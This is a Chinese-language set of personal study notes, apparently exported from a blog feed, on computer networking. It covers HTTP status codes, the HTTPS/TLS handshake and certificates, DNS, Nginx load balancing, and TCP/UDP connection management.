<p>「<strong>304 Not Modified</strong>」不具有跳转的含义，表示资源未修改，重定向已存在的缓冲文件，也称缓存重定向，也就是告诉客户端可以继续使用缓存资源，用于缓存控制。</p>
</li>
</ul>
<p><code>4xx</code> 类状态码表示客户端发送的<strong>报文有误</strong>，服务器无法处理，也就是错误码的含义。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>「<strong>400 Bad Request</strong>」表示客户端请求的报文有错误，但只是个笼统的错误。</p>
</li>
<li class="lvl-2">
<p>「<strong>403 Forbidden</strong>」表示服务器禁止访问资源，并不是客户端的请求出错。</p>
</li>
<li class="lvl-2">
<p>「<strong>404 Not Found</strong>」表示请求的资源在服务器上不存在或未找到，所以无法提供给客户端。</p>
</li>
</ul>
<p><code>5xx</code> 类状态码表示客户端请求报文正确，但是<strong>服务器处理时内部发生了错误</strong>，属于服务器端的错误码。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>「<strong>500 Internal Server Error</strong>」与 400 类型，是个笼统通用的错误码，服务器发生了什么错误，我们并不知道。</p>
</li>
<li class="lvl-2">
<p>「<strong>501 Not Implemented</strong>」表示客户端请求的功能还不支持，类似“即将开业，敬请期待”的意思。</p>
</li>
<li class="lvl-2">
<p>「<strong>502 Bad Gateway</strong>」通常是服务器作为网关或代理时返回的错误码，表示服务器自身工作正常，访问后端服务器发生了错误。</p>
</li>
<li class="lvl-2">
<p>「<strong>503 Service Unavailable</strong>」表示服务器当前很忙，暂时无法响应客户端，类似“网络服务正忙，请稍后重试”的意思。</p>
</li>
</ul>
<h1>2 HTTP和HTTPS区别</h1>
<blockquote>
<p>HTTPS 协议（Hyper Text Transfer Protocol Secure），是 HTTP 的加强安全版本。HTTPS 是基于 HTTP 的，也是用 TCP 作为底层协议，并额外使用 SSL/TLS 协议用作加密和安全认证。默认端口号是 443.</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>端口号</strong>：HTTP 默认是 80，HTTPS 默认是 443。</p>
</li>
<li class="lvl-2">
<p><strong>安全性和资源消耗</strong>：HTTP 协议运行在 TCP 之上，所有传输的内容都是明文，客户端和服务器端都无法验证对方的身份。HTTPS 是运行在 SSL/TLS 之上的 HTTP 协议，SSL/TLS 运行在 TCP 之上。所有传输的内容都经过加密，加密采用对称加密，但<code>对称加密的密钥用服务器方的证书进行了非对称加密</code>。所以说，HTTP 安全性没有 HTTPS 高，但是 HTTPS 比 HTTP 耗费更多服务器资源。</p>
</li>
<li class="lvl-2">
<p><strong>SEO（搜索引擎优化）</strong>：搜索引擎通常会更青睐使用 HTTPS 协议的网站，因为 HTTPS 能够提供更高的安全性和用户隐私保护。使用 HTTPS 协议的网站在搜索结果中可能会被优先显示，从而对 SEO 产生影响。</p>
</li>
<li class="lvl-2">
<p>使用 SSL/TLS 协议用作加密和安全认证；非对称加密交换密钥，对称加密传输消息</p>
</li>
<li class="lvl-3">
<p>HTTPS 协议需要向 CA（证书权威机构）申请数字证书，来保证服务器的身份是可信的。</p>
</li>
</ul>
<p>区别主要有以下四点：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>HTTP 是超文本传输协议，信息是明文传输，存在安全风险的问题。HTTPS 则解决 HTTP 不安全的缺陷，在 TCP 和 HTTP 网络层之间加入了 SSL/TLS 安全协议，使得报文能够加密传输。</p>
</li>
<li class="lvl-2">
<p>HTTP 连接建立相对简单， TCP 三次握手之后便可进行 HTTP 的报文传输。而 HTTPS 在 TCP 三次握手之后，还需进行 SSL/TLS 的握手过程，才可进入加密报文传输。</p>
</li>
<li class="lvl-2">
<p>两者的默认端口不一样，HTTP 默认端口号是 80，HTTPS 默认端口号是 443。</p>
</li>
<li class="lvl-2">
<p>HTTPS 协议需要向 CA（证书权威机构）申请数字证书，来保证服务器的身份是可信的。</p>
</li>
</ul>
<blockquote>
<p>[!note]<br>
SSL/TLS协议作用：认证用户和服务，加密数据，维护数据的完整性的应用层协议加密和解密需要两个不同的密钥，故被称为非对称加密；加密和解密都使用同一个密钥的</p>
</blockquote>
<p>为了公钥传输的信赖性问题，第三方机构应运而生——<mark>证书颁发机构</mark>（CA，Certificate Authority）。CA 默认是受信任的第三方。CA 会给各个服务器颁发证书，证书存储在服务器上，并附有 CA 的<strong>电子签名</strong>。</p>
<p>数字签名要解决的问题，是防止证书被伪造。第三方信赖机构 CA 之所以能被信赖，就是 <strong>靠数字签名技术</strong> 。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202409081621021.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>非对称加密（公钥加密、私钥解密）</p>
</li>
<li class="lvl-2">
<p>对称加密</p>
</li>
<li class="lvl-2">
<p>证书颁发机构（CA，Certificate Authority）——数字签名技术</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202408232251539.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>可以通过哈希算法来保证消息的完整性；</p>
</li>
<li class="lvl-2">
<p>可以通过数字签名来保证消息的来源可靠性（能确认消息是由持有私钥的一方发送的）；<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202409081626747.png" alt="image.png"></p>
</li>
</ul>
<h2 id="2-1-HTTPS防范中间人攻击">2.1 HTTPS防范中间人攻击</h2>
<p>加密：https 握手期间会通过非对称加密的方式来协商出对称加密密钥。身份校验：服务器会向证书颁发机构申请数字证书，证书中包含了服务器的公钥和其他相关信息。当客户端与服务器建立连接时，服务器会将证书发送给客户端。客户端会验证证书的合法性，包括检查证书的有效期、颁发机构的信任等。如果验证通过，客户端会使用证书中的公钥来加密通信数据，并将加密后的数据发送给服务器，然后由服务端用私钥解密</p>
<h2 id="2-2-HTTPS运行流程">2.2 HTTPS运行流程</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202409212351325.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>用户在浏览器里输入一个https网址，然后连接到server的443端口。</p>
</li>
<li class="lvl-2">
<p>服务器必须要有一套<strong>数字证书</strong>，可以自己制作，也可以向组织申请，区别就是自己颁发的证书需要客户端验证通过。这套证书其实就是一对公钥和私钥。</p>
</li>
<li class="lvl-2">
<p>服务器将自己的<mark>数字证书</mark>（含有公钥）发送给客户端。</p>
</li>
<li class="lvl-2">
<p>客户端收到服务器端的数字证书之后，会对其进行检查，如果不通过，则弹出警告框。如果证书没问题，则<mark>生成一个密钥（对称加密）</mark>，用证书的公钥对它加密。</p>
</li>
<li class="lvl-2">
<p>客户端会发起HTTPS中的第二个HTTP请求，将加密之后的客户端密钥发送给服务器。</p>
</li>
<li class="lvl-2">
<p>服务器接收到客户端发来的密文之后，会用自己的私钥对其进行非对称解密，解密之后得到客户端密钥，然后用客户端密钥对返回数据进行对称加密，这样数据就变成了密文。</p>
</li>
<li class="lvl-2">
<p>服务器将加密后的密文返回给客户端。</p>
</li>
<li class="lvl-2">
<p>客户端收到服务器发返回的密文，用自己的密钥（客户端密钥）对其进行对称解密，得到服务器返回的数据</p>
</li>
</ul>
<h3 id="2-2-1-TCP三次握手">2.2.1 TCP三次握手</h3>
<h3 id="2-2-2-TLS四次握手">2.2.2 TLS四次握手</h3>
<h4 id="TLS第一次握手：client-server-Client-Hello">TLS第一次握手：client -&gt; server  (Client Hello)</h4>
<p>客户端向服务端发送：</p>
<ol>
<li class="lvl-3">
<p>客户端支持的协议；</p>
</li>
<li class="lvl-3">
<p>已经使用的TLS版本；</p>
</li>
<li class="lvl-3">
<p>随机数Random（Client Random）</p>
</li>
<li class="lvl-3">
<p>支持的密码套件。</p>
</li>
</ol>
<p>客户端发送完「Client Hello」，服务端向客户端发送的ACK确认消息，代表上面的「Client Hello」已经收到。这里也可以看出服务端是通过普通的TCP 的ACK消息去应答「Client Hello」。</p>
<h4 id="TLS第二次握手：server-client-1-Server-Hello-2-Certificate-Server-key-Exchange-Server-Hello-Done">TLS第二次握手：server -&gt; client (1.Server Hello; 2.Certificate,Server key Exchange,Server Hello Done)</h4>
<ol>
<li class="lvl-3">
<p><strong>Server Hello</strong>：</p>
<ul class="lvl-2">
<li class="lvl-6">服务端支持的协议；</li>
<li class="lvl-6">使用的TLS版本；</li>
<li class="lvl-6">随机数Random==（Server Random）==</li>
<li class="lvl-6">服务端选用的密码套件。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>Certificate</strong>：服务端为了证明自己的身份，会发送「Server Certificate」给客户端，这个消息里含有数字证书；</p>
</li>
<li class="lvl-3">
<p><strong>Server key Exchange,Server Hello Done</strong>：目的是告诉客户端，我已经把该给你的东西都给你了，本次打招呼完毕。</p>
</li>
</ol>
<p>::: note<br>
<em>数字证书签发和验证流程</em><br>
:::</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202410062251845.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>CA(证书认证机构)对公钥等信息进行Hash计算，并通过私钥加密，对证书进行签名</p>
</li>
<li class="lvl-2">
<p>首先客户端会使用同样的 Hash 算法获取该证书的 Hash 值 H1</p>
</li>
<li class="lvl-2">
<p>浏览器收到证书后可以使用 CA 的公钥解密 Certificate Signature 内容，得到一个Hash值H2</p>
</li>
</ul>
<h4 id="TLS第三次握手client-server-Client-Key-Exchange-Change-Cipher-Spec-Encrypted-Handshake-Message">TLS第三次握手client -&gt; server (Client Key Exchange, Change Cipher Spec, Encrypted Handshake Message)</h4>
<h5 id="Client-Key-Exchange">Client Key Exchange</h5>
<p>客户端收到了服务端的证书及「Server Hello Done」消息后，首先通过浏览器或者操作系统中的CA公钥<mark>校验证书</mark>，校验通过后会将Client Params数据传递给服务端，其中包含自身生成的椭圆曲线公钥（Pubkey）</p>
<p>接着，客户端就会生成一个新的<strong>随机数 (pre-master)</strong>，用服务器的 RSA 公钥加密该随机数，通过「<strong>Client Key Exchange</strong>」消息传给服务端。</p>
<h5 id="Change-Cipher-Spec">Change Cipher Spec</h5>
<p>加密通信算法改变通知，「Change Cipher Spec」消息表示客户端已经生成密钥，并<mark>切换到对称加密模式</mark>。</p>
<h5 id="Encrypted-Handshake-Message">Encrypted Handshake Message</h5>
<ol>
<li class="lvl-3">
<p>告诉服务端，客户端在握手的过程中收到和发送的数据做一个摘要并用会话密钥加密发送给服务端做校验，保证TSL握手过程中报文没有被修改过；</p>
</li>
<li class="lvl-3">
<p>如果服务端收到这个消息并能解密成功，就能说明对称密钥是正确的。</p>
</li>
</ol>
<p>「Encrypted Handshake Message」消息其实不只是客户端会发送，之后服务端也会发送一个。</p>
<h4 id="TLS-第四次握手server-client-Change-Cipher-Spec-Encrypted-Handshake-Message">TLS 第四次握手server -&gt; client (Change Cipher Spec,Encrypted Handshake Message)</h4>
<p>（1）加密通信算法改变通知，表示随后的信息都将用「会话秘钥」加密通信。<br>
（2）服务器握手结束通知，表示服务器的握手阶段已经结束。这一项同时把之前所有内容的发生的数据做个摘要，用来供客户端校验。</p>
<p><a href="https://javaguide.cn/cs-basics/network/http-vs-https.html">HTTP vs HTTPS（应用层） | JavaGuide</a></p>
<p><a href="https://mp.weixin.qq.com/s/nzT3idzmhe7rJg-EikLWvA">字节校招一面：聊聊https 原理</a></p>
<h3 id="2-2-3-秘钥交换算法">2.2.3 秘钥交换算法</h3>
<p><a href="https://xiaolincoding.com/network/2_http/https_rsa.html">RSA 算法</a>和 <a href="https://xiaolincoding.com/network/2_http/https_ecdhe.html">ECDHE 算法</a></p>
<h3 id="2-2-4-HTTPS一定安全可靠吗">2.2.4 HTTPS一定安全可靠吗</h3>
<p>客户端通过浏览器向服务端发起 HTTPS 请求时，被「假基站」转发到了一个「中间人服务器」，于是客户端是和「中间人服务器」完成了 TLS 握手，然后这个「中间人服务器」再与真正的服务端完成 TLS 握手。</p>
<p>发生这种场景是有前提的，前提是用户点击接受了中间人服务器的证书。 中间人服务器与客户端在 TLS 握手过程中，实际上发送了自己伪造的证书给浏览器，而这个伪造的证书是能被浏览器（客户端）识别出是非法的，于是就会提醒用户该证书存在问题。</p>
<h1>3 HTTP和RPC区别</h1>
<p><strong>RPC（即Remote Procedure Call，远程过程调用）和HTTP（HyperText Transfer Protocol，超文本传输协议）</strong>，两者前者是一种方法，后者则是一种协议。两者都常用于实现服务，在这个层面最本质的区别是RPC服务主要工作在TCP协议之上（也可以在HTTP协议），而HTTP服务工作在HTTP协议之上。由于HTTP协议基于TCP协议，所以RPC服务天然比HTTP更轻量，效率更胜一筹。</p>
<p><a href="https://cloud.tencent.com/developer/article/1979507">HTTP和RPC的区别-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><a href="https://xiaolincoding.com/network/2_http/http_rpc.html#%E4%BB%8E-tcp-%E8%81%8A%E8%B5%B7">3.8 既然有 HTTP 协议，为什么还要有 RPC？ | 小林coding (xiaolincoding.com)</a></p>
<h1>4 DNS</h1>
<p>DNS（Domain Name System）域名管理系统，是当用户使用浏览器访问网址之后，使用的第一个重要协议。DNS 要解决的是<strong>域名和 IP 地址的映射问题</strong>。</p>
<blockquote>
<p>[!note]<br>
浏览器缓存，系统缓存，路由器缓存，IPS服务器缓存，根域名服务器缓存，顶级域名服务器缓存，主域名服务器缓存。一、主机向本地域名服务器的查询一般都是采用递归查询。二、本地域名服务器向根域名服务器的查询的迭代查询。</p>
</blockquote>
<blockquote>
<p>DNS：递归（通过其他服务器解析）、迭代（自己处理解析过程）<br>
<strong>迭代</strong>查询对于客户端来说比较复杂，需要自行处理多次查询和跳转。 迭代查询可以减少DNS服务器的负载，因为客户端自行进行多次查询可以分散服务器的压力。 在实际应用中，递归查询和迭代查询各有优缺点。 递归查询可以减少客户端的复杂度，但需要DNS服务器具备较高的处理能力和带宽资源。 而迭代查询可以减轻DNS服务器的压力，但需要客户端自行进行多次查询和跳转。</p>
</blockquote>
<h2 id="4-1-DNS负载均衡">4.1 DNS负载均衡</h2>
<p>当一个网站有足够多的用户的时候，假如每次请求的资源都位于同一台机器上面，那么这台机器随时可能会崩掉。处理办法就是用DNS负载均衡技术，它的原理是在<mark>DNS服务器中为同一个主机名配置多个IP地址</mark>,在应答DNS查询时,DNS服务器对每个查询将以DNS文件中主机记录的IP地址按顺序返回不同的解析结果,将客户端的访问引导到不同的机器上去,使得不同的客户端访问不同的服务器,从而达到负载均衡的目的｡例如可以根据每台机器的负载量，该机器离用户地理位置的距离等等。</p>
<h2 id="4-2-DNS劫持">4.2 DNS劫持</h2>
<p>DNS 劫持是一种网络攻击，它通过修改 DNS 服务器的解析结果，使用户访问的域名指向错误的 IP 地址，从而导致用户无法访问正常的网站，或者被引导到恶意的网站。DNS 劫持有时也被称为 DNS 重定向、DNS 欺骗或 DNS 污染。</p>
<h1>5 Nginx负载均衡算法</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>轮询：按照顺序依次将请求分配给后端服务器。这种算法最简单，但是也无法处理某个节点变慢或者客户端操作有连续性的情况。</p>
</li>
<li class="lvl-2">
<p>IP哈希：根据客户端IP地址的哈希值来确定分配请求的后端服务器。适用于需要保持同一客户端的请求始终发送到同一台后端服务器的场景，如会话保持。</p>
</li>
<li class="lvl-2">
<p>URL哈希：按访问的URL的哈希结果来分配请求，使每个URL定向到一台后端服务器，可以进一步提高后端缓存服务器的效率。</p>
</li>
<li class="lvl-2">
<p>最短响应时间：按照后端服务器的响应时间来分配请求，响应时间短的优先分配。适用于后端服务器性能不均的场景，能够将请求发送到响应时间快的服务器，实现负载均衡。</p>
</li>
<li class="lvl-2">
<p>加权轮询：按照权重分配请求给后端服务器，权重越高的服务器获得更多的请求。适用于后端服务器性能不同的场景，可以根据服务器权重分配请求，提高高性能服务器的利用率。</p>
</li>
</ul>
<h1>6 参考</h1>
<h2 id="6-1-HTTP">6.1 HTTP</h2>
<p><a href="https://mp.weixin.qq.com/s/HtqRUKYxidXFCa2-z9M8ew">重磅！图文详解HTTPS协议通信全过程，结合抓包实战分析，带你一次看透HTTPS！ (qq.com)</a><br>
<a href="https://xiaolincoding.com/network/2_http/https_rsa.html#tls-%E6%8F%A1%E6%89%8B%E8%BF%87%E7%A8%8B">3.3 HTTPS RSA 握手解析 | 小林coding (xiaolincoding.com)</a></p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络：传输层</title>
    <url>/2023/02/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C(3)%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82/</url>
    <content><![CDATA[<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic/20210717222557.PNG" alt="IMG_2742(20210717-194249)" style="zoom:50%;" />
<blockquote>
<p>[!note]<br>
MSS(TCP最大报文段长度)：MSS=TCP报文段长度-TCP首部长度<br>
MTU：maximum transmission unit，最大传输单元，由硬件规定，如以太网的MTU为1500字节。<br>
MSS：maximum segment size，最大分节大小，为TCP数据包每次传输的最大数据分段大小，一般由发送端向对端TCP通知对端在每个分节中能发送的最大TCP数据。MSS值为MTU值减去IPv4 Header（20 Byte）和TCP header（20 Byte）得到</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202408242130827.png" alt="image.png"></p>
<h1>1 传输层</h1>
<blockquote>
<p>首部和数据差错检验，MSS（TCP最大报文段长度）</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>TCP（Transmission Control Protocol，传输控制协议 ）</strong>：提供 <strong>面向连接</strong> 的，<strong>可靠</strong> 的数据传输服务。</p>
</li>
<li class="lvl-2">
<p><strong>UDP（User Datagram Protocol，用户数据协议）</strong>：提供 <strong>无连接</strong> 的，<strong>尽最大努力</strong> 的数据传输服务（不保证数据传输的可靠性），简单高效。</p>
</li>
</ul>
<h2 id="1-1-滑动窗口">1.1 滑动窗口</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403312207501.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>基序号(base)：最早未确认分组的序号</p>
</li>
<li class="lvl-2">
<p>下一个序号：下一个待发送分组序号</p>
</li>
<li class="lvl-2">
<p>N：窗口长度</p>
</li>
</ul>
<blockquote>
<p>滑动窗口是一种流量控制机制，窗口是一个缓冲区，允许发送方在未收到确认的情况下发送数据。窗口的大小定义了发送方可以发送但还未被确认的数据段的最大数量。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>建立连接时的窗口大小协商</strong>：在TCP三次握手建立连接的过程中，双方会交换窗口大小的信息，以确定初始的窗口大小。</p>
</li>
<li class="lvl-2">
<p><strong>数据的发送与确认</strong>：发送方根据窗口大小发送数据。每当接收方成功接收到一个数据段，它就会向发送方发送一个确认（ACK）报文，表明已成功接收到数据并准备好接收更多数据。</p>
</li>
<li class="lvl-2">
<p><strong>窗口的滑动</strong>：随着数据被发送和确认，窗口会“滑动”。具体来说，当发送方收到一个确认报文时，它会将窗口的起始点向前移动到已确认数据的下一个未被确认的数据段。这样，窗口内就包含了新的未发送但可以发送的数据段。</p>
</li>
<li class="lvl-2">
<p><strong>窗口大小的调整</strong>：滑动窗口的大小可以根据接受放的处理能力来进行流量控制。如果处理能力下降，接收方可能会减小窗口大小；如果状况良好，接收方可能会增大窗口大小，以允许更快的数据传输。</p>
</li>
<li class="lvl-2">
<p><strong>数据的重传</strong>：如果发送方在一段时间内没有收到某个数据段的确认，它会假设该数据段丢失，并重新发送该数据段。重新发送的触发通常是基于一个计时器，该计时器会在发送数据段时启动，并在未收到确认时超时。<a href="https://zhuanlan.zhihu.com/p/135932018">图解 TCP 重传、滑动窗口、流量控制、拥塞控制 - 知乎 (zhihu.com)</a></p>
</li>
</ul>
<blockquote>
<p>[!note] 端口号范围<br>
UDP和TCP报头使用两个字节存放端口号，所以端口号的有效范围是从0到65535。动态端口的范围是从1024到65535</p>
</blockquote>
<h1>2 UDP（无连接、尽最大努力、面向报文）</h1>
<blockquote>
<p>不可靠的、无连接的服务</p>
</blockquote>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic/202109172010252.png" alt="image-20210917201002072" style="zoom:33%;" />
<ul class="lvl-0">
<li class="lvl-2">
<p>校验和：校验和是为了提供可靠的 UDP 首部和数据而设计，防止收到在网络传输中受损的 UDP 包。</p>
</li>
<li class="lvl-2">
<p>多路复用/多路分解</p>
</li>
<li class="lvl-2">
<p>差错检测</p>
</li>
</ul>
<h2 id="2-1-特点">2.1 特点</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>UDP是<strong>无连接的</strong>；</p>
</li>
<li class="lvl-2">
<p>UDP使用<strong>尽最大努力交付</strong>，即不保证可靠交付，因此主机不需要维持复杂的链接状态（这里面有许多参数）；</p>
</li>
<li class="lvl-2">
<p>UDP是<strong>面向报文</strong>的；</p>
</li>
<li class="lvl-2">
<p>UDP<strong>没有拥塞控制</strong>，因此网络出现拥塞不会使源主机的发送速率降低（对实时应用很有用，如IP电话，实时视频会议等）；</p>
</li>
<li class="lvl-2">
<p>UDP<strong>支持一对一、一对多、多对一和多对多</strong>的交互通信；</p>
</li>
<li class="lvl-2">
<p>UDP的<strong>首部开销小</strong>，只有8个字节，比TCP的20个字节的首部要短。</p>
</li>
</ul>
<h1>3 TCP协议（面向连接、可靠、字节流）</h1>
<p>无差错、不丢失、不重复、按序到达</p>
<blockquote>
<p>[!note]<br>
“面向字节流”的含义是：虽然应用程序和TCP的交互是一次一个数据块（大小不等），但TCP把应用程序交下来的数据仅仅看成是一连串的无结构的字节流。</p>
</blockquote>
<h2 id="3-1-TCP报文段结构">3.1 TCP报文段结构</h2>
<blockquote>
<p>TCP（Transmission Control Protocol, 传输控制协议），可靠的、面向连接的服务</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>面向连接</strong>：一定是「一对一」才能连接，不能像 UDP 协议可以一个主机同时向多个主机发送消息，也就是一对多是无法做到的；</p>
</li>
<li class="lvl-2">
<p><strong>可靠的</strong>：无论的网络链路中出现了怎样的链路变化，TCP 都可以保证一个报文一定能够到达接收端</p>
</li>
<li class="lvl-2">
<p><strong>字节流</strong>：用户消息通过 TCP 协议传输时，消息可能会被操作系统「分组」成多个的 TCP 报文，如果接收方的程序如果不知道「消息的边界」，是无法读出一个有效的用户消息的。并且 TCP 报文是「有序的」，当「前一个」TCP 报文没有收到的时候，即使它先收到了后面的 TCP 报文，那么也不能扔给应用层去处理，同时对「重复」的 TCP 报文会自动丢弃。（有点向Raft协议中将log从领导者复制到其他server）</p>
</li>
</ul>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403142123563.png" alt="image-20240314212340508" style="zoom: 50%;" />
<ul class="lvl-0">
<li class="lvl-2">
<p>序号：数据部分第一个字节的编号</p>
</li>
<li class="lvl-2">
<p>确认号：指明接收方下一次希望收到的报文段的数据部分第一个字节的编号</p>
</li>
<li class="lvl-2">
<p>窗口（16bit）：接收窗口。用于告知对方（发送方）本方的缓冲还能接收多少字节数据。用于解决流控。</p>
</li>
<li class="lvl-2">
<p>校验和（16bit）：接收端用CRC检验整个报文段有无损坏</p>
</li>
</ul>
<p>应用程序的端口号和应用程序所在主机的 IP 地址统称为 socket（套接字），IP:端口号, 在互联网上 socket 唯一标识每一个应用程序，源端口+源IP+目的端口+目的IP称为”套接字对“，一对套接字就是一个连接，一个客户端与服务器之间的连接。</p>
<p>提供的服务</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>差错控制</p>
</li>
<li class="lvl-2">
<p>流量控制：消除发送方使接收方缓存溢出的可能，速度匹配</p>
</li>
<li class="lvl-2">
<p>拥塞控制：发送方因IP网络的拥塞而被遏制</p>
</li>
</ul>
<h2 id="3-2-连接管理">3.2 连接管理</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202404012100827.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>FIN_WAIT_2：</p>
<ul class="lvl-2">
<li class="lvl-6">半关闭状态。</li>
<li class="lvl-6">发送断开请求一方还有接收数据能力，但已经没有发送数据能力。</li>
</ul>
</li>
<li class="lvl-2">
<p>CLOSE_WAIT状态：</p>
<ul class="lvl-2">
<li class="lvl-6">被动关闭连接一方接收到FIN包会立即回应ACK包表示已接收到断开请求。</li>
<li class="lvl-6">被动关闭连接一方如果还有剩余数据要发送就会进入CLOSE_WAIT状态。</li>
</ul>
</li>
<li class="lvl-2">
<p>TIME_WAIT状态：</p>
<ul class="lvl-2">
<li class="lvl-6">又叫2MSL等待状态。</li>
<li class="lvl-6">如果客户端直接进入CLOSED状态，如果服务端没有接收到最后一次ACK包会在超时之后重新再发FIN包，此时因为客户端已经CLOSED，所以服务端就不会收到ACK而是收到RST。所以TIME_WAIT状态目的是防止最后一次握手数据没有到达对方而触发重传FIN准备的。</li>
<li class="lvl-6">在2MSL时间内，同一个socket不能再被使用，否则有可能会和旧连接数据混淆（如果新连接和旧连接的socket相同的话）。</li>
</ul>
</li>
</ul>
<p>一个tcp连接需要：1，socket文件描述符；2，IP地址；3，端口；4，内存（读缓冲区、写缓冲区）</p>
<h3 id="3-2-1-三次握手">3.2.1 三次握手</h3>
<blockquote>
<p>同步序列编号(Synchronize Sequence Numbers)是 TCP/IP 建立连接时使用的握手信号三次握手能<strong>防止历史连接的建立，能减少双方不必要的资源开销，能帮助双方同步初始化序列</strong></p>
</blockquote>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403142122331.png" style="zoom:33%;" />
<ul class="lvl-0">
<li class="lvl-2">
<p>客户端发送带有SYN的数据包到服务器端(SEQ=X)</p>
</li>
<li class="lvl-2">
<p>服务器为该TCP连接分配缓存和变量（<mark>SYN泛洪攻击</mark>），并向客户端发送SYNACK报文段（SEQ=Y, ACK=X+1）</p>
</li>
<li class="lvl-2">
<p>客户端收到SYNACK报文段，分配缓存和变量，对服务器允许连接的报文段进行确认(ACK=Y+1)</p>
</li>
</ul>
<p>三次握手的原因：  、</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>三次握手才可以阻止重复历史连接的初始化（主要原因）</p>
</li>
<li class="lvl-2">
<p>三次握手才可以同步双方的初始序列号</p>
</li>
<li class="lvl-2">
<p>三次握手才可以避免资源浪费</p>
</li>
</ul>
<blockquote>
<p>[!question] 两次握手和四次握手</p>
</blockquote>
<p>两次握手：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>无法防止历史连接的建立</code>：由于网络原因，客户端发送了多次SYN同步报文段，历史的SYN先到达服务器导致服务器建立连接，会造成双方资源的浪费</p>
</li>
<li class="lvl-2">
<p>无法同步双方序列号：服务器就客户端的初始序列号达成一致，但客户端还未就服务器的初始序列号进行确认四次握手：</p>
</li>
<li class="lvl-2">
<p>客户端发送SYN</p>
</li>
<li class="lvl-2">
<p>服务器收到SYN发送ACK</p>
</li>
<li class="lvl-2">
<p>服务器发送SYN</p>
</li>
<li class="lvl-2">
<p>哭护短收到SYN发送ACK<br>
其中，第二步和第三步可以优化为一步。三次握手就已经理论上最少可靠连接建立，所以不需要使用更多的通信次数。</p>
</li>
</ul>
<h3 id="3-2-2-四次挥手">3.2.2 四次挥手</h3>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403152255901.png" alt="image.png" style="zoom: 50%;" />
<ul class="lvl-0">
<li class="lvl-2">
<p>客户端发送FIN到服务端，发送关闭连接命令</p>
</li>
<li class="lvl-2">
<p>服务器收到FIN，发送ACK确认报文段（客户端没有数据要发，但服务器可能还未收到所有数据）</p>
</li>
<li class="lvl-2">
<p>服务器发送种植报文段FIN</p>
</li>
<li class="lvl-2">
<p>客户端进行确认，此时如果客户端等待 <strong>2MSL</strong> 后依然没有收到回复，就证明服务端已正常关闭，随后客户端也可以关闭连接了。</p>
</li>
</ul>
<blockquote>
<p>[!question] 为什么需要四次挥手<br>
TCP 是全双工通信，可以双向传输数据。任何一方都可以在数据传送结束后发出连接释放的通知，待对方确认后进入半关闭状态。当另一方也没有数据再发送的时候，则发出连接释放通知，对方确认后就完全关闭了 TCP 连接。</p>
</blockquote>
<blockquote>
<p>[!question] 为什么第四次挥手客户端需要等待 2*MSL（报文段最长寿命）时间后才进入 CLOSED 状态？第四次挥手时，客户端发送给服务器的 ACK 有可能丢失，如果服务端因为某些原因而没有收到 ACK 的话，<mark>服务端就会重发 FIN</mark>，如果客户端在 2*MSL 的时间内收到了 FIN，就会重新发送 ACK 并再次等待 2MSL，防止 Server 没有收到 ACK 而不断重发 FIN。在等待2MSL后没有收到重传FIN，则客户端认为服务器已经收到了ACK报文防止“已失效的连接请求报文段”出现在本连接中。 客户端在发送完最后一个ACK报文段后，再经过2MSL，就可以使本连接持续的时间内所产生的所有报文段都从网络中消失，使下一个新的连接中不会出现这种旧的连接请求报文段。</p>
</blockquote>
<blockquote>
<p>[!note]<br>
<strong>MSL(Maximum Segment Lifetime)</strong> : 一个片段在网络中最大的存活时间，2MSL 就是一个发送和一个回复所需的最大时间。如果直到 2MSL，Client 都没有再次收到 FIN，那么 Client 推断 ACK 已经被成功接收，则结束 TCP 连接</p>
</blockquote>
<p><a href="https://segmentfault.com/a/1190000041875584">tcp - 经典问题：TIME-WAIT 时长为何为2 MSL？ - the_blog - SegmentFault 思否</a></p>
